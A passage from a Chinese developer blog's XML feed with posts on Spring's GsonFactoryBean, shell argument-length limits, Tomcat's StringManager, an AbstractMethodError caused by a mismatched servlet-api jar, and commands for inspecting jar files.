class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GsonFactoryBean</span> <span class="keyword">implements</span> <span class="title">FactoryBean</span>&lt;<span class="title">Gson</span>&gt;, <span class="title">InitializingBean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> base64EncodeByteArrays = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> serializeNulls = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> prettyPrinting = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> disableHtmlEscaping = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String dateFormatPattern;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Gson gson;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBase64EncodeByteArrays</span><span class="params">(<span class="keyword">boolean</span> base64EncodeByteArrays)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.base64EncodeByteArrays = base64EncodeByteArrays;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSerializeNulls</span><span class="params">(<span class="keyword">boolean</span> serializeNulls)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.serializeNulls = serializeNulls;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrettyPrinting</span><span class="params">(<span class="keyword">boolean</span> prettyPrinting)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.prettyPrinting = prettyPrinting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDisableHtmlEscaping</span><span class="params">(<span class="keyword">boolean</span> disableHtmlEscaping)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.disableHtmlEscaping = disableHtmlEscaping;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDateFormatPattern</span><span class="params">(String dateFormatPattern)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dateFormatPattern = dateFormatPattern;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        GsonBuilder builder = (<span class="keyword">this</span>.base64EncodeByteArrays ?</span><br><span class="line">                GsonBuilderUtils.gsonBuilderWithBase64EncodedByteArrays() : <span class="keyword">new</span> GsonBuilder());</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.serializeNulls) &#123;</span><br><span class="line">            builder.serializeNulls();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.prettyPrinting) &#123;</span><br><span class="line">            builder.setPrettyPrinting();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.disableHtmlEscaping) &#123;</span><br><span class="line">            builder.disableHtmlEscaping();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.dateFormatPattern != <span class="keyword">null</span>) &#123;</span><br><span class="line">            builder.setDateFormat(<span class="keyword">this</span>.dateFormatPattern);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.gson = builder.create();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Gson <span class="title">getObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.gson;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; getObjectType() &#123;</span><br><span class="line">        <span class="keyword">return</span> Gson<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSingleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>GsonFactoryBean</code>除了实现了<code>FactoryBean</code>接口，还实现了<code>InitializingBean</code>接口，这个接口只有一个方法</p>
<p><code>afterPropertiesSet</code>。这个方法会在bean的所有提供的属性被设置之后，被BeanFactory调用，是spring保留的一个扩展点。</p>
<p><code>GsonFactoryBean</code>在这个方法中将收集到的配置信息传给builder，构建出一个<code>Gson</code>对象（这种一般是大对象，一个容器中有一个就够了）。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"gsonFactoryBean"</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.json.GsonFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dateFormatPattern"</span> <span class="attr">value</span>=<span class="string">"yyyy-MM-dd"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"disableHtmlEscaping"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prettyPrinting"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/html/beans.html" rel="external nofollow noopener noreferrer" target="_blank">7. The IoC container</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> beanfactory </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[shell命令长度限制]]></title>
      <url>http://qsli.github.io/2017/02/06/shell-input-limit/</url>
      <content type="html"><![CDATA[<h2 id="两个命令"><a href="#两个命令" class="headerlink" title="两个命令"></a>两个命令</h2><h3 id="ARG-MAX"><a href="#ARG-MAX" class="headerlink" title="ARG_MAX"></a>ARG_MAX</h3><blockquote>
<p>The limit for the length of a command line is not imposed by the shell, but by the operating system. This limit is usually in the range of hundred kilobytes. POSIX denotes this limit ARG_MAX and on POSIX conformant systems you can query it with</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ getconf ARG_MAX    <span class="comment"># Get argument limit in bytes</span></span><br></pre></td></tr></table></figure>
<p>在我的cygwin上的结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  getconf ARG_MAX</span><br><span class="line">32000</span><br></pre></td></tr></table></figure>
<h3 id="xargs-–show-limits"><a href="#xargs-–show-limits" class="headerlink" title="xargs –show-limits"></a>xargs –show-limits</h3><p>我的Cygwin上的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜   xargs --show-limits</span><br><span class="line">您的环境变量占有 7787 个字节</span><br><span class="line">此系统的参数长度 POSIX 上限: 22165</span><br><span class="line">所有系统中所允许的最小参数长度 POSIX 上限: 4096</span><br><span class="line">我们实际能用的最大命令长度: 14378</span><br><span class="line">我们实际能用的命令缓冲区的大小: 22165</span><br><span class="line">Maximum parallelism (--max-procs must be no greater): 2147483647</span><br><span class="line"></span><br><span class="line">xargs 中的命令现在将继续执行，并且它会尝试读取输入并运行命令；如果您不想它发生，请按下“文件结束”按键(ctrl-D)。</span><br><span class="line">警告: echo 将至少运行一次。如果您不想它发生，请按下中断按键。(ctrl-C)</span><br></pre></td></tr></table></figure>
<h2 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h2><p>使用脚本编写。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://stackoverflow.com/questions/19354870/bash-command-line-and-input-limit" rel="external nofollow noopener noreferrer" target="_blank">shell - Bash command line and input limit - Stack Overflow</a></p>
</li>
<li><p><a href="http://stackoverflow.com/questions/6846263/maximum-length-of-command-line-argument-that-can-be-passed-to-sqlplus-from-lin" rel="external nofollow noopener noreferrer" target="_blank">Maximum length of command line argument that can be passed to SQL*Plus (from Linux C Shell)? - Stack Overflow</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
        <tags>
            
            <tag> limit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcat中的StringManager]]></title>
      <url>http://qsli.github.io/2017/02/06/tomcat-stringmanager/</url>
      <content type="html"><![CDATA[<p>tomcat中使用StringManager来管理错误提示信息，错误信息存储在<code>LocalStrings.properties</code>文件中，支持包级别的文件配置。</p>
<h2 id="StringManager"><a href="#StringManager" class="headerlink" title="StringManager"></a>StringManager</h2><p>构造函数私有，通过静态方法<code>getManager</code>获取对应package的实例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Hashtable&lt;String, StringManager&gt; managers =</span><br><span class="line">        <span class="keyword">new</span> Hashtable&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the StringManager for a particular package. If a manager for</span></span><br><span class="line"><span class="comment"> * a package already exists, it will be reused, else a new</span></span><br><span class="line"><span class="comment"> * StringManager will be created and returned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> packageName The package name</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">synchronized</span> StringManager <span class="title">getManager</span><span class="params">(String packageName)</span> </span>&#123;</span><br><span class="line">    StringManager mgr = managers.get(packageName);</span><br><span class="line">    <span class="keyword">if</span> (mgr == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mgr = <span class="keyword">new</span> StringManager(packageName);</span><br><span class="line">        managers.put(packageName, mgr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mgr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="LocalStrings"><a href="#LocalStrings" class="headerlink" title="LocalStrings"></a>LocalStrings</h2><p>本身支持国际化(i18n), LocalStrings.properties（英文）、LocalStrings_es.properties（西班牙语）、LocalStrings_ja.properties（日语）</p>
<p>文件示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contextBindings.unknownContext=Unknown context name : &#123;0&#125;</span><br><span class="line">contextBindings.noContextBoundToThread=No naming context bound to this thread</span><br><span class="line">contextBindings.noContextBoundToCL=No naming context bound to this class loader</span><br><span class="line">selectorContext.noJavaUrl=This context must be accessed through a java: URL</span><br><span class="line">selectorContext.methodUsingName=Call to method &apos;&apos;&#123;0&#125;&apos;&apos; with a Name of &apos;&apos;&#123;1&#125;&apos;&apos;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>《How tomcat works》</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> string-manager </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcat访问时发生AbstractMethodError]]></title>
      <url>http://qsli.github.io/2017/01/27/tomcat-AbstractMethodError/</url>
      <content type="html"><![CDATA[<h2 id="异常堆栈"><a href="#异常堆栈" class="headerlink" title="异常堆栈"></a>异常堆栈</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.ServletException: Servlet execution threw an exception</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:313) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206) [catalina.jar:6.0.29]</span><br><span class="line">        at qunar.ServletWatcher.doFilter(ServletWatcher.java:160) ~[common-core-8.3.5.jar:na]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206) [catalina.jar:6.0.29]</span><br><span class="line">        at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:121) [spring-web-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:555) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298) [catalina.jar:6.0.29]</span><br><span class="line">        at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:857) [tomcat-coyote.jar:6.0.29]</span><br><span class="line">        at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588) [tomcat-coyote.jar:6.0.29]</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489) [tomcat-coyote.jar:6.0.29]</span><br><span class="line">        at java.lang.Thread.run(Thread.java:745) [na:1.8.0_60]</span><br><span class="line">Caused by: java.lang.AbstractMethodError: null</span><br><span class="line">        at javax.servlet.http.HttpServletResponseWrapper.getStatus(HttpServletResponseWrapper.java:228) ~[lib/:na]</span><br><span class="line">        at javax.servlet.http.HttpServletResponseWrapper.getStatus(HttpServletResponseWrapper.java:228) ~[lib/:na]</span><br><span class="line">        at org.springframework.web.servlet.FrameworkServlet.publishRequestHandledEvent(FrameworkServlet.java:1070) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1003) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:859) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at javax.servlet.http.HttpServlet.doHead(HttpServlet.java:244) ~[lib/:na]</span><br><span class="line">        at javax.servlet.http.HttpServlet.service(HttpServlet.java:644) ~[lib/:na]</span><br><span class="line">        at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:844) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at javax.servlet.http.HttpServlet.service(HttpServlet.java:728) ~[lib/:na]</span><br><span class="line">        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290) [catalina.jar:6.0.29]</span><br><span class="line">        ... 19 common frames omitted</span><br></pre></td></tr></table></figure>
<h3 id="AbstractMethodError异常"><a href="#AbstractMethodError异常" class="headerlink" title="AbstractMethodError异常"></a>AbstractMethodError异常</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Thrown when an application tries to call an abstract method.</span></span><br><span class="line"><span class="comment"> * Normally, this error is caught by the compiler; this error can</span></span><br><span class="line"><span class="comment"> * only occur at run time if the definition of some class has</span></span><br><span class="line"><span class="comment"> * incompatibly changed since the currently executing method was last</span></span><br><span class="line"><span class="comment"> * compiled.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  unascribed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   JDK1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AbstractMethodError</span> <span class="keyword">extends</span> <span class="title">IncompatibleClassChangeError</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>就是调用了一个没有实现的抽象方法时会抛出这个异常。</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><h3 id="环境被搞乱"><a href="#环境被搞乱" class="headerlink" title="环境被搞乱"></a>环境被搞乱</h3><p>有人把<code>servlet-api 3.0</code>的jar包拷贝到了<code>tomcat6</code>的lib目录下，替换了原来的jar包，造成spring以为他支持Servlet3.0 但是tomcat却没有实现这个方法。</p>
<h2 id="Spring-版本"><a href="#Spring-版本" class="headerlink" title="Spring 版本"></a>Spring 版本</h2><p>Spring的版本是4.2.5，增加了一些<code>Servlet 3.0</code> 的特性支持, 但是使用之前Spring会根据使用的</p>
<p><code>Servlet-api</code>来检测是否支持<code>Servlet 3.0</code></p>
<p>使用的3.0的api</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the current status code of this response.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the current status code of this response</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Servlet 3.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getStatus</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>在<code>FrameworkServlet</code>中会进行相应的检测和使用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/** Checking for Servlet 3.0+ HttpServletResponse.getStatus() */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> responseGetStatusAvailable =</span><br><span class="line">            ClassUtils.hasMethod(HttpServletResponse.class, "getStatus");</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">publishRequestHandledEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HttpServletRequest request, HttpServletResponse response, <span class="keyword">long</span> startTime, Throwable failureCause)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.publishEvents) &#123;</span><br><span class="line">        <span class="comment">// Whether or not we succeeded, publish an event.</span></span><br><span class="line">        <span class="keyword">long</span> processingTime = System.currentTimeMillis() - startTime;</span><br><span class="line">        <span class="keyword">int</span> statusCode = (responseGetStatusAvailable ? response.getStatus() : -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">this</span>.webApplicationContext.publishEvent(</span><br><span class="line">            <span class="keyword">new</span> ServletRequestHandledEvent(<span class="keyword">this</span>,</span><br><span class="line">                    request.getRequestURI(), request.getRemoteAddr(),</span><br><span class="line">                    request.getMethod(), getServletConfig().getServletName(),</span><br><span class="line">                    WebUtils.getSessionId(request), getUsernameForRequest(request),</span><br><span class="line">                    processingTime, failureCause, statusCode));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="为什么编译时没有报错"><a href="#为什么编译时没有报错" class="headerlink" title="为什么编译时没有报错"></a>为什么编译时没有报错</h3><blockquote>
<p>当前的JVM规范中，与方法调用相关的指令有4个：invokevirtual、invokeinterface、invokestatic与invokespecial。其中调用接口方法时使用的JVM指令是invokeinterface。这个指令与另外3个方法调用指令有一个显著的差异：它不要求JVM的校验器（verifier）检查被调用对象（receiver）的类型；另外3个方法调用指令都要求校验被调用对象。也就是说，使用invokeinterface时如果被调用对象没有实现指定的接口，则应该在运行时而不是链接时抛出异常；而另外3个方法调用指令都要求在链接时抛出异常。 </p>
</blockquote>
<p>这也是为啥类的载入是成功的，但是tomcat里面没有实现那个方法。</p>
<h2 id="servlet和tomcat的对应关系"><a href="#servlet和tomcat的对应关系" class="headerlink" title="servlet和tomcat的对应关系"></a>servlet和tomcat的对应关系</h2>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://rednaxelafx.iteye.com/blog/400362" rel="external nofollow noopener noreferrer" target="_blank">JVM在校验阶段不检查接口的实现状况 - Script Ahead, Code Behind - ITeye技术网站</a></p>
</li>
<li><p><a href="http://tomcat.apache.org/whichversion.html" rel="external nofollow noopener noreferrer" target="_blank">Apache Tomcat® - Which Version Do I Want?</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[jar文件查看]]></title>
      <url>http://qsli.github.io/2017/01/27/jar/</url>
      <content type="html"><![CDATA[<p>查看jar包内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -q -c myarchive.jar META-INF/MANIFEST.MF</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>-q</code> will suppress verbose output from the unzip program</p>
</blockquote>
<blockquote>
<p><code>-c</code> will extract to stdout</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unzip -q -c servlet-api.jar META-INF/MANIFEST.MF</span><br><span class="line">Manifest-Version: 1.0</span><br><span class="line">Ant-Version: Apache Ant 1.8.1</span><br><span class="line">Created-By: 1.6.0_45-b06 (Sun Microsystems Inc.)</span><br><span class="line">X-Compile-Source-JDK: 1.6</span><br><span class="line">X-Compile-Target-JDK: 1.6</span><br><span class="line"></span><br><span class="line">Name: javax/servlet/</span><br><span class="line">Specification-Title: Java API for Servlets</span><br><span class="line">Specification-Version: 3.0</span><br><span class="line">Specification-Vendor: Sun Microsystems, Inc.</span><br><span class="line">Implementation-Title: javax.servlet</span><br><span class="line">Implementation-Version: 3.0.FR</span><br><span class="line">Implementation-Vendor: Apache Software Foundation</span><br></pre></td></tr></table></figure>
<h2 id="jar命令"><a href="#jar命令" class="headerlink" title="jar命令"></a>jar命令</h2><p>在linux下如何查看一个jar文件中有哪些类呢？</p>
<p><code>jar tf test.jar</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">META-INF/</span><br><span class="line">META-INF/MANIFEST.MF</span><br><span class="line">javax/</span><br><span class="line">javax/servlet/</span><br><span class="line">javax/servlet/annotation/</span><br><span class="line">javax/servlet/descriptor/</span><br><span class="line">javax/servlet/http/</span><br><span class="line">...</span><br><span class="line">javax/servlet/resources/xml.xsd</span><br><span class="line">META-INF/NOTICE</span><br><span class="line">META-INF/LICENSE</span><br></pre></td></tr></table></figure>
<h2 id="grepjar"><a href="#grepjar" class="headerlink" title="grepjar"></a>grepjar</h2><p>有些时候，我们需要查看一个jar文件中是否包含了某个方法，这个在linux下可以通过下面的命令来查询</p>
<p><code>grepjar methodName class.jar</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grepjar <span class="string">'getStatus'</span> servlet-api.jar</span><br><span class="line">javax/servlet/http/HttpServletResponse.class:getStatus</span><br><span class="line">javax/servlet/http/HttpServletResponseWrapper.class:getStatus</span><br></pre></td></tr></table></figure>
<p>参数：</p>
<p>||option || meaning ||<br>|-b |  Print byte offset of match.|<br>|–|—————|<br>|-c |  Print number of matches.|<br>|-i |  Compare case-insensitively.|<br>|-n |  Print line number of each match.|<br>|-s |  Suppress error messages.|<br>|-w |  Force PATTERN to match only whole words.|<br>|-e | PATTERN  Use PATTERN as regular expression.|<br>|–help |  Print help, then exit.|<br>|-V |  |<br>|–version |   Print version number, then exit.|</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://stackoverflow.com/questions/7066063/how-to-read-manifest-mf-file-from-jar-using-bash" rel="external nofollow noopener noreferrer" target="_blank">How to read MANIFEST.MF file from JAR using Bash - Stack Overflow</a></p>
<p><a href="http://xiaofengwu.tumblr.com/post/63518704051/linux%E6%9F%A5%E7%9C%8Bjar%E4%B8%AD%E7%9A%84%E7%B1%BB%E4%BB%A5%E5%8F%8A%E7%B1%BB%E4%B8%AD%E6%96%B9%E6%B3%95%E5%91%BD%E4%BB%A4" rel="external nofollow noopener noreferrer" target="_blank">吴峰子 — linux查看jar中的类以及类中方法命令</a></p>
<p><a href="http://www.tutorialspoint.com/unix_commands/grepjar.htm" rel="external nofollow noopener noreferrer" target="_blank">grepdiff - Unix, Linux Command</a></p>
]]></content>
      
        <categories>
            
